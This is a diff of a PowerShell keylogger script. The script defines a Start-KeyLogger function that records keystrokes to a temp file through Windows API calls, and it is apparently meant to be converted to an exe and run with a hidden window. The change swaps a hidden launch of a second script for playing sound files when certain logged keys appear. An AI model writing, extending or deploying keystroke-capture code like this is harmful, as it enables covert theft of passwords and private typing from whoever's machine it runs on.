@@ -1,8 +1,10 @@
 ######################################################################
-## after you modify the information below then convert it to exe file#
+## VARIABLES# 
 ######################################################################
-function muzikcal {
-Start-Process powershell.exe -windowstyle hidden "C:\Users\batu\Desktop\muzikcal.ps1"
+$sarki1 = 'C:\Users\batu\Desktop\ouch.wav'#a#
+$sarki2 = 'C:\Users\batu\Desktop\silk.wav'#b#
+function muzikcal($sarki) {
+Start-Process  $sarki
 }
 
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
@@ -68,7 +70,10 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             foreach ($Line in $akdeniz) {
                $a = $Line.Remove(0, ($Line.Length -1));
                if ($a -eq "a"){
-                muzikcal
+                muzikcal($sarki1)
+               }
+               elseif ($a -eq "b"){
+                muzikcal($sarki2)
                }
                
                  }
